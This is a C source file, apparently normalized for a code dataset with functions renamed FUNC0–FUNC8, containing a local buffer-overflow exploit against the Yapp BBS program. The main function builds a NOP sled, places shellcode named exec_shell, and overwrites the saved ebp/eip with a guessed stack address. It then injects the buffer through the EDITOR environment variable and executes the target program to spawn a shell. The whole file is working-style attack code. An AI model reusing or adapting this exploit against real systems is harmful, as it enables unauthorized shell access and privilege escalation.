#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  buff ;

/* Variables and functions */
 char* BBS_PROGRAM ; 
 scalar_t__ BUFFSIZE ; 
 int /*<<< orphan*/  OFFSET ; 
 int /*<<< orphan*/ * exec_shell ; 
 int /*<<< orphan*/  FUNC0 (char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (unsigned char*,int,int) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 scalar_t__ FUNC5 (char*,unsigned char*,int) ; 
 int FUNC6 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 

int FUNC8 (void)
{
    unsigned char buff [518];               /* Buffer to hold our data. */
    unsigned char *ptr;                     /* Pointer. */
    int count;                              /* Counter. */
    unsigned long *address_ptr;             /* Long pointer. */

    /* First we fill the buffer with NOP instructions. */
    (void) FUNC3 (buff, 0x90, sizeof (buff));

    /* Then we copy our shell code into the buffer. */
    ptr = buff;
    ptr += BUFFSIZE - FUNC6 (exec_shell);

    for (count = 0; count < FUNC6 (exec_shell); count++)
        *ptr++ = exec_shell [count];

    /* Now we insert our return address into ebp and eip. */
    address_ptr = (unsigned long *) &buff [509];

    for (count = 0; count < 2; count++)
        *address_ptr++ = FUNC2 () + OFFSET;

    /* Here we terminate the buffer as a string... */
    ptr = (unsigned char *) address_ptr;
    *ptr = '\0';

    /* And attempt to load it into our environment. */
    FUNC7 ("EDITOR");

    if (FUNC5 ("EDITOR", buff, 1)) {
        FUNC4 ("setenv");
        FUNC1 (1);
    }

    /* Finally, we execute Yapp. */
    (void) FUNC0 (BBS_PROGRAM, BBS_PROGRAM, NULL);
    FUNC4 (BBS_PROGRAM);
    FUNC1 (1);
}